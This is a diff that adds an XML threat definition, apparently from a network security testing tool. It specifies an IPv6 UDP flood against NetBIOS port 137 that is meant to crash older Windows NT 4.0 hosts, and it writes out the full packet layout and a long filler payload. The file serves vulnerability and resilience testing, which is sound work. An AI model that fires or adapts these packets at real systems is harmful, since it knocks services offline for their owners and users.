@@ -1,0 +1,59 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <SoftwareRevision display="true" value="1.4"/>
+    <ExecDesc value="IPv6 Microsoft NetBIOS Denial of Service" display="true"/>
+    <EngDesc value="This threat sends a large amount of data at UDP port 137.  Known to cause older implementations of Microsoft Windows to use 100% CPU and crash the NetBIOS service.  This is an IPv6 version of this threat." display="true"/>
+    <RunOnce value="false" display="false"/>
+    <Intent display="true">
+      <item value="Crashing"/>
+    </Intent>
+    <Protocol value="NETBIOS_NS" display="true"/>
+    <Type_Of_Equipment value="Host" display="true"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Windows"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Windows_NT_4.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true"/>
+    <Author value="Chuck McAuley" display="true"/>
+    <ID value="000000ffb7b49e3f00c000a80001003c13f9e74d" display="true"/>
+    <Revision value="1" display="true"/>
+    <Suite display="true" value="Standard"/>
+    <AccessVector value="remote"/>
+    <AccessComplexity value="low"/>
+    <Authentication value="not-required"/>
+    <ConfImpact value="none"/>
+    <IntegImpact value="none"/>
+    <AvailImpact value="complete"/>
+    <ImpactBias value="normal"/>
+    <Created value="1139462126" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIPv6" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+    <NamedVar name="destIPv6" type="ImperfectControls.IPv6Address" value="null" index="E"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="86DD">
+      <IPv6 Version="6" Priority="0" Flow-Label="0" Payload-Length="2c8" Next-Header="11" Hop-Limit="80" Source-Address="$sourceIPv6" Destination-Address="$destIPv6">
+        <UDPv6 srcPort="@random(1025,65535)" destPort="$destPort" checksum="@checksum(UDPv6.srcPort,UDPv6.destPort,UDPv6.length,UDPv6.v6payload,IPv6.Source-Address,IPv6.Destination-Address,IPv6.Payload-Length,00,IPv6.Next-Header,CRC16)" length="2c8" v6payload="414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141410a"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+</threatSignature>
